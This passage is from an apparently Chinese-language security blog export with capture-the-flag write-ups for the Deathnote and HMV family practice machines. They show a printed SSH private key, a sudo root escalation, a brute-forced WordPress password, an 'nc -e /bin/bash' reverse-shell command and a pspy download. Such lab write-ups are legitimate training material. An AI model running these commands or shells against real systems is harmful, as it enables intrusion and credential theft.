class="number">19</span>  <span class="number">2021</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> kira kira   <span class="number">39</span> <span class="title class_">Feb</span> <span class="number">10</span> <span class="number">23</span><span class="symbol">:</span><span class="number">48</span> .bash_history</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kira kira  <span class="number">220</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kira kira <span class="number">3526</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .bashrc</span><br><span class="line">-rwx------ <span class="number">1</span> kira root   <span class="number">85</span> <span class="title class_">Aug</span> <span class="number">29</span>  <span class="number">2021</span> kira.txt</span><br><span class="line">drwxr-xr-x <span class="number">3</span> kira kira <span class="number">4096</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .local</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kira kira  <span class="number">807</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .profile</span><br><span class="line">drwxr-xr-x <span class="number">2</span> kira kira <span class="number">4096</span> <span class="title class_">Jul</span> <span class="number">19</span>  <span class="number">2021</span> .ssh</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="variable">$ </span>cd .ssh</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira/</span>.ssh<span class="variable">$ </span>ls</span><br><span class="line">authorized_keys</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira/</span>.ssh<span class="variable">$ </span>cat authorized_keys </span><br><span class="line">ssh-rsa <span class="title class_">AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3</span>/<span class="title class_">Jy93n0NfPqOX7HGkLBasYR0v</span>/<span class="title class_">IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj</span>/<span class="number">6</span>vBi+wMyFF3jQhP4Su72ssLH1n/<span class="title class_">E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k</span>/<span class="title class_">POyhURC6MW0V</span>/aQICFZ6z l<span class="variable">@deathnote</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªauthorized_keys å…¬é’¥æ˜¯lçš„,é‚£å°±å¯ä»¥ç”¨lçš„ç§é’¥ç™»å½•kiraç”¨æˆ·äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">l@deathnote:~<span class="operator">/</span>.ssh$ ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">l@deathnote:~<span class="operator">/</span>.ssh$ cat id_rsa</span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8olvOzliq1dCltd3iliYq<span class="operator">+</span>fIU<span class="symbol">/CGwumetUmTYeGM5vV5X03AsrQx</span></span><br><span class="line"><span class="operator">+</span>eroQzqrTEeo1c7PagklxkBS4XOiDDxevWDIivck1OWoU<span class="symbol">/C5nztDm6kn0gBh2ktIuQO96c</span></span><br><span class="line">ZalExx684Qd<span class="symbol">/ycvd59DXz6jl+xxpCwWrGEdL/yK3ke+IogSNCbHg8cq2Qi3JeofVdFolNJ</span></span><br><span class="line">o2zzQRjn38<span class="operator">+</span>NQiTe<span class="symbol">/MtmFwblJYjgI/+rwYvsDMhRd40IT+Eru9rLCx9Z/xNhwYpg9Be+Zo</span></span><br><span class="line">uixPUjbiOjYr2yVFmRa320ITdhUrCB57qCyCUH7hWbELSbAUPXd8r0w9pPzzsoVEQujFtF</span><br><span class="line">f2kCAhWeswAAA8gGaU36BmlN<span class="operator">+</span>gAAAAdzc2gtcnNhAAABAQDyiW87OWKrV0KW13eKWJir58</span><br><span class="line">hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU</span><br><span class="line"><span class="number">5</span>ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3<span class="symbol">/Jy93n0NfPqOX7HGkLBasYR0v/IreR</span></span><br><span class="line"><span class="number">74</span>iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj<span class="symbol">/6vBi+wMyFF3</span></span><br><span class="line">jQhP4Su72ssLH1n<span class="symbol">/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZ</span></span><br><span class="line">sQtJsBQ9d3yvTD2k<span class="symbol">/POyhURC6MW0V/aQICFZ6zAAAAAwEAAQAAAQEAn0yfj1GougtNRE/v</span></span><br><span class="line">RyHb3QUW8fMIQFs7j6zsrZx8dHIErxEdoQJz1MdymD2fpzFl9lCosOejNOyow0W0yL6aJ1</span><br><span class="line"><span class="number">67</span>OXMMcP0Kq19wO<span class="operator">+</span>KsDEB1VBxGKR<span class="symbol">/LeyG3CiXq9n6jUJL/BCAaPyc0EbjlxL+bv2TnQBpa</span></span><br><span class="line">emhcQiuCqRHoFIoQAkOqSo7ylyy5trn0aShCUur47VCfb6h<span class="symbol">/bZPkG+n1am9ZM9P5PJ4LwK</span></span><br><span class="line">EFdKPJwXvaKvXUZOysKauwRxVpHQvlYR1WtvHj51Xb8iTyIFcGGUk<span class="operator">+</span>e0GpxTgaru<span class="symbol">/e3e8l</span></span><br><span class="line">Pd09G6ln8XgvzoLP6axaf8s39x3b4T0bVMVwVMs6j6V08QAAAIB3jZQ0VvKwJF7rimibzY</span><br><span class="line">ha7YVcYPKiLfjlC2hEe3wh5af0CvMtq7VvjkmNKFbBGZ41NtRjNRylPtNKn1HA9UI8pUXN</span><br><span class="line">KeKFpmmn6IeszRm86eFmGXB5rnsan<span class="symbol">/M2Mr3qfIOI9Xpiv0XML8idtSxOBC91rx269BHb2h</span></span><br><span class="line"><span class="number">6</span>QGsYXA<span class="symbol">/fhjQAAAIEA/mrWAdzdukdspQuoBRYWgBg1HjW38fn/CXvwHlx+3u61RRTmXLBl</span></span><br><span class="line">badAoyC5flrOzdubDdozp<span class="operator">+</span>p7n4mGBmRI8CPxhyrTKDduVb0TpH1M7NWboYazhqwm6j1Fki</span><br><span class="line">mBM<span class="symbol">/WOeLxM5VvUAN31jETQajjyDyx0Oo1PDy4NKBJ6I22LHUsAAACBAPQLrb05ptUGPdHC</span></span><br><span class="line">CLpY3Go52IpEjW<span class="operator">+</span>HjP60KQCkyGPBzSJeVbRE5yT7wBIevTIzk7OW1V3Kzx0816X116w4dz</span><br><span class="line"><span class="number">44</span>OmPP8lcu4JTrRmNEO6ptX7dI4BrfbpA49hLsG1<span class="symbol">/QWuP/QkrE/+aiKEU2mtxOAkj72zJ2</span></span><br><span class="line">KHY9pOWV1D9Uwas5AAAAC2xAZGVhdGhub3RlAQIDBAUGBw<span class="operator">==</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br><span class="line">l@deathnote:~<span class="operator">/</span>.ssh$ ssh kira@<span class="number">192.168</span>.<span class="number">179.40</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">The authenticity of host &#x27;<span class="number">192.168</span>.<span class="number">179.40</span> (<span class="number">192.168</span>.<span class="number">179.40</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:IT1oaQY12jhOmyoQGZC1hKHtYUWy6i8rET2yKX0KkpI.</span><br><span class="line">Are you sure you want to continue connecting (yes<span class="operator">/</span>no)<span class="operator">?</span> yes</span><br><span class="line"><span class="params">Warning:</span> Permanently added &#x27;<span class="number">192.168</span>.<span class="number">179.40</span>&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">Linux deathnote <span class="number">4.19</span>.<span class="number">0</span><span class="operator">-</span><span class="number">1</span>7-amd64 <span class="comment">#1 SMP Debian 4.19.194-2 (2021-06-21) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU<span class="symbol">/Linux</span> system are free software;</span><br><span class="line">the exact distribution terms for each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="operator">/</span>usr<span class="operator">/</span>share<span class="operator">/</span>doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">Last login: Sat Sep  4 06:00:09 2021 from 127.0.0.1</span></span><br><span class="line"><span class="comment">kira@deathnote:~$ </span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åé€šè¿‡kira.txtè¿™ä¸ªå†…å®¹ï¼Œä¹Ÿèƒ½æ‰¾åˆ°&#x2F;opt&#x2F;Lè¿™ä¸ªæ–‡ä»¶ç„¶åå¾—åˆ°kiraå¯†ç ï¼Œç»§ç»­ä¸‹é¢æ“ä½œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">kira.txt</span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>cat kira.txt </span><br><span class="line">cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp</span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp&quot;</span> | base64 -d</span><br><span class="line">please protect one of the following </span><br><span class="line"><span class="number">1</span>. L (/opt)</span><br><span class="line"><span class="number">2</span>. <span class="title class_">Misa</span> (/var)kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">kira:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> kira on <span class="symbol">deathnote:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> kira may run the following commands on <span class="symbol">deathnote:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="title class_">ALL</span></span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>su - root</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line"><span class="symbol">su:</span> <span class="title class_">Authentication</span> failure</span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /bin/bash</span><br><span class="line">root<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™å°±æ˜¯kamiå—ï¼Œèƒ½æœ‰ä»»ä½•çš„æƒé™ï¼Œ<br><img src="https://pic1.imgdb.cn/item/67aad4a0d0e0a243d4fe42a5.png"><br><img src="https://pic1.imgdb.cn/item/67aad4dbd0e0a243d4fe42ab.png"><br>ç‰¹åœ°æ‰¾å‡ºååœºé¢å“ˆå“ˆå“ˆï¼Œè¿™ä¸ªç•ªçœŸçš„è¶…çº§å¥½çœ‹æ— æ•Œæ¨è</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-family</title>
    <url>/posts/9478.html</url>
    <content><![CDATA[<p>HMV-familyé¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67ad5a9fd0e0a243d4feb932.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.112.12  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span> <span class="number">10</span>:<span class="number">41</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">112.12</span> (<span class="number">192.168</span>.<span class="number">112.12</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">0</span>d:<span class="number">4</span>e:fd:<span class="number">57</span>:<span class="number">05</span>:<span class="number">8</span>f:d0:d6:<span class="number">1</span>d:<span class="number">67</span>:<span class="number">5</span>d:<span class="number">6</span>d:<span class="number">4</span>e:b5:c9:fc (RSA)</span><br><span class="line">|   <span class="number">256</span> d4:<span class="number">98</span>:fb:a7:<span class="number">94</span>:bd:<span class="number">0</span>c:c6:a8:<span class="number">60</span>:<span class="number">5</span>b:bc:b9:c7:f4:<span class="number">51</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> fa:<span class="number">34</span>:<span class="number">3</span>a:<span class="number">25</span>:<span class="number">74</span>:<span class="number">40</span>:<span class="number">99</span>:fc:<span class="number">4</span>f:<span class="number">60</span>:be:db:<span class="number">7</span>e:<span class="number">7</span>f:<span class="number">93</span>:be (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span></span><br><span class="line">|<span class="params">_http-title:</span> Index of <span class="symbol">/</span></span><br><span class="line">| <span class="params">http-ls:</span> Volume <span class="symbol">/</span></span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| <span class="operator">-</span>     <span class="number">202</span>0-<span class="number">0</span>2-<span class="number">06</span> <span class="number">07</span>:<span class="number">33</span>  wordpress<span class="symbol">/</span></span><br><span class="line">|_</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">06</span>:<span class="number">66</span>:FC:<span class="number">0</span>B:B7:E2 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">Host:</span> <span class="number">127.0</span>.<span class="number">1.1</span>; <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.38</span> ms <span class="number">192.168</span>.<span class="number">112.12</span> (<span class="number">192.168</span>.<span class="number">112.12</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">12.44</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾80 å’Œ 22ç«¯å£ï¼Œè€Œä¸”80ç«¯å£æ˜¯wordpress</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>ç›´æ¥è®¿é—®webç«¯ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç‚¹å¼€å†…å®¹ï¼š<br><img src="https://pic1.imgdb.cn/item/67ad5c66d0e0a243d4feb98a.png"><br>ä½†æ˜¯ç”¨wpscanç›´æ¥æ‰«æè¯´è¿™ä¸ªç«™ç‚¹ä¸æ˜¯wordpressï¼Œä½†æ˜¯æˆ‘æäº¤è¿™ä¸ªè¾“å…¥æ¡†çš„æ—¶å€™è·³è½¬çš„é¡µé¢çš„urlå˜äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¿®æ”¹hostsæ–‡ä»¶<br>ä¿®æ”¹ä¹‹åå°±å¯ä»¥æ­£å¸¸è¿›å…¥wordpressçš„ç™»å½•ç•Œé¢äº†ï¼Œé»˜è®¤éƒ½åœ¨&#x2F;wp-admin<br><img src="https://pic1.imgdb.cn/item/67ad61b5d0e0a243d4febad7.png"><br>ç„¶åç”¨bpæŠ“åŒ…ï¼ŒæŒ‡å®šç”¨æˆ·åä¸º<code>admin</code>çˆ†ç ´å¯†ç <br>å¾—åˆ°å¯†ç  <code>phantom</code><br><img src="https://pic1.imgdb.cn/item/67ad6b79d0e0a243d4febf91.png"><br>æˆåŠŸè¿›å…¥wordpressç•Œé¢<br><img src="https://pic1.imgdb.cn/item/67ad6f5ed0e0a243d4fec0b3.png"><br>æ¥ç€å®‰è£…WPTermæ’ä»¶ï¼Œè®©ä»–å¯ä»¥æ‰§è¡ŒshellæŒ‡ä»¤ <a href="https://wordpress.org/plugins/wpterm/">https://wordpress.org/plugins/wpterm/</a><br>åœ¨å·¥å…·è¿™å°±èƒ½æ‰¾åˆ°è¿™ä¸ªæ’ä»¶<br><img src="https://pic1.imgdb.cn/item/67ad7384d0e0a243d4fec1b4.png"><br><code> nc 192.168.112.83 1234 -e /bin/bash</code>è¾“å…¥åå¼¹shellæŒ‡ä»¤ï¼ŒæˆåŠŸå¾—åˆ°www-datashell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234                </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data<span class="variable">@family</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>stty raw -echo; fg</span><br><span class="line">stty raw -echo; fg</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">fg:</span> <span class="symbol">current:</span> no such job</span><br><span class="line">www-data<span class="variable">@family</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>^Z</span><br><span class="line"><span class="symbol">zsh:</span> suspended  nc -lp <span class="number">1234</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># stty raw -echo; fg</span></span><br><span class="line">[<span class="number">1</span>]  + continued  nc -lp <span class="number">1234</span></span><br><span class="line">                             <span class="symbol">reset:</span> unknown terminal type unknown</span><br><span class="line"><span class="title class_">Terminal</span> type? xterm</span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>å»å®¶ç›®å½•çœ‹åˆ°ä¸€å…±æœ‰ä¸‰ä¸ªç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@family</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>ls /home</span><br><span class="line">baby  father  mother</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥æ‰¾åˆ°wwwç”¨æˆ·çš„å†å²è®°å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">www-data@family:/var/www$ <span class="built_in">cat</span> .bash_history </span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> baby</span><br><span class="line"><span class="built_in">cd</span> mother</span><br><span class="line"><span class="built_in">cd</span> father</span><br><span class="line">clear</span><br><span class="line">find / -group www-data -<span class="built_in">type</span> f 2&gt;/dev/null | grep -v /var/www</span><br><span class="line">find / -group www-data -<span class="built_in">type</span> f 2&gt;/dev/null | grep -v -E <span class="string">&quot;/var/www|proc&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /usr/share/perl/5.28.1/perso.txt</span><br><span class="line"><span class="built_in">ls</span> -l /usr/share/perl/5.28.1/perso.txt</span><br><span class="line">su - father</span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line">www-data@family:/var/www$ <span class="built_in">cat</span> /usr/share/perl/5.28.1/perso.txt</span><br><span class="line">uncrackablepassword</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æœ‰ä¸€ä¸ªå¯ç–‘çš„æ–‡ä»¶ï¼Œä»–è®¿é—®è¿‡è¿™ä¸ªæ–‡ä»¶ä¹‹åå°±åˆ‡æ¢åˆ°fatherç”¨æˆ·äº†<br>æˆ‘ä»¬ç”¨è¿™ä¸ªå¯†ç å°è¯•ä¹‹åï¼Œæœç„¶å¯ä»¥åˆ‡æ¢åˆ°fatherç”¨æˆ·</p>
<h2 id="father"><a href="#father" class="headerlink" title="father"></a>father</h2><p>ä»–çš„ç›®å½•ä¸‹é¢ä»€ä¹ˆéƒ½æ²¡æœ‰,æ²¡æœ‰sudo æ²¡æœ‰suidï¼Œä¸‹ä¸€æ­¥ä»æœ¬æœºä¸‹è½½pspy64çœ‹çœ‹å®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.112.12</span> - - <span class="string">[13/Feb/2025 12:52:51]</span> <span class="string">&quot;<span class="keyword">GET</span> /pspy64 HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">father@family:~$ wget <span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">83</span>/pspy64</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">05</span>:<span class="number">52</span>:<span class="number">50</span>--  http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">83</span>/pspy64</span><br><span class="line">Connecting to <span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">3104768</span> (<span class="number">3</span>.0M) <span class="string">[application/octet-stream]</span></span><br><span class="line">Saving to: â€˜pspy64â€™</span><br><span class="line"></span><br><span class="line">pspy64                       <span class="number">100</span>%<span class="string">[=============================================&gt;]</span>   <span class="number">2</span>.96M  --.-KB/s    in <span class="number">0</span>.09s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">05</span>:<span class="number">52</span>:<span class="number">51</span> (<span class="number">33</span>.<span class="number">1</span> MB/s) - â€˜pspy64â€™ saved <span class="string">[3104768/3104768]</span></span><br><span class="line"></span><br><span class="line">father@family:~$ chmod +x pspy64</span><br><span class="line">father@family:~$ ./pspy64</span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>/<span class="number">02</span>/<span class="number">13</span> <span class="number">05</span>:<span class="number">54</span>:<span class="number">01</span> CMD: UID=<span class="number">1001</span>  PID=<span class="number">963</span>    | /bin/sh -c python ~/check.py </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°uidä¸º1001çš„ç”¨æˆ·å®šæ—¶æ‰§è¡Œä»–çš„å®¶ç›®å½•ä¸‹é¢çš„check.pyæ–‡ä»¶<br>ä»&#x2F;etc&#x2F;passwdä¸­èƒ½æ‰¾åˆ°1001æ˜¯mother</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">father<span class="variable">@family</span><span class="symbol">:/home</span><span class="variable">$ </span>cat /etc/passwd</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span 